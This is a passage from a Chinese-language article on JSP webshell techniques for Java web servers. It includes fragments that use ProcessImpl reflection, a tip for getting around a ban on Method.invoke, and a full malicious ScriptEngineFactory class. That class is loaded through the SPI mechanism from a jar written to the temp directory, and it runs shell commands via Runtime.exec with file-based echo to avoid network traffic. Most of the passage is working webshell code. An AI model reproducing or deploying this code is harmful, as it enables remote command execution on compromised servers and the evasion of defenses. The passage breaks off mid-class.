        public static class Threedr3am_9 {
            public static final Class clz = Class.forName("java.lang.ProcessImpl");
            public static Object[] ooo;
        }
    %>
     0) {
            response.getOutputStream().write(stringBuilder.toString().getBytes());
        }
    %>
如果遇到了禁用Method.invoke的情况，我们还能使用MethodAccessor.invoke进行反射调用方法。
### 十、使用了SPI机制的ScriptEngineManager自动加载实例化JSP Webshell
    SPI机制的ScriptEngineManager自动加载实例化JSP Webshell
     iterator = ServiceLoader
                    .load(ScriptEngineFactory.class, new URLClassLoader(new URL[]{new URL("file:" + jarPath)})).iterator();
            while (iterator.hasNext())
                iterator.next();
        } catch (Throwable e) {
            response.getOutputStream().write(e.getCause().getMessage().getBytes());
        }
    %>
java的spi机制，具体也很简单，我也不想描述，可以去查查资料，这里的base64的内容，其实就是自行编译的一个jar包，其中有个恶意类实现了ScriptEngineFactory，在调用`new
ScriptEngineManager(new URLClassLoader(new URL[]{new URL("file://" +
jarPath)}));`，其中的代码实现会加载jar包内的`META-INF/services/javax.script.ScriptEngineFactory`文件，读取class名，然后从jar包中加载并实例化，这样就能触发恶意类的代码执行了。
而这个jsp
webshell的逻辑，利用了写临时文件，把jar写到临时目录持久化，让URLClassLoader能不出网本地加载，然后寄存用户shell命令到临时目录下的文件jabdhjabdjkandaldlanaklndkand.txt，接着在加载jar执行完命令后，把输出结果寄存在临时目录下的文件jfkdjkadnkladmknjknfkjnadkad.txt，最后在jsp中对其内容进行读取回显。
恶意class的内容是这样的：
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.List;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineFactory;
    import java.io.File；
    /**
     * @author LaoHaiScript
     */
    public class LaoHaiScript implements ScriptEngineFactory {
      public LaoHaiScript() {
        try {
          String tmp = System.getProperty("java.io.tmpdir");
          String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
          String outputFile = tmp + File.separator + "jfkdjkadnkladmknjknfkjnadkad.txt";
          InputStream inputStream = Runtime.getRuntime().exec(new String(Files.readAllBytes(Paths.get(inputFile))).split(" ")).getInputStream();
          StringBuilder stringBuilder = new StringBuilder();
          BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
          String line;
          while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
          }
          if (Files.exists(Paths.get(outputFile)))
            Files.delete(Paths.get(outputFile));
          Files.write(Paths.get(outputFile), stringBuilder.toString().getBytes());
        } catch (Throwable e) {
          e.printStackTrace();
        }
      }
      @Override
      public String getEngineName() {
        return null;
      }
      @Override
      public String getEngineVersion() {
        return null;
      }
      @Override
      public List getExtensions() {
        return null;
      }
      @Override
      public List getMimeTypes() {
        return null;
      }
      @Override
      public List getNames() {
        return null;
      }
      @Override
      public String getLanguageName() {
        return null;
      }
      @Override
      public String getLanguageVersion() {
        return null;
      }
      @Override
      public Object getParameter(String key) {
        return null;
      }
      @Override
      public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
      }
      @Override
      public String getOutputStatement(String toDisplay) {
        return null;
      }
      @Override
      public String getProgram(String... statements) {
        return null;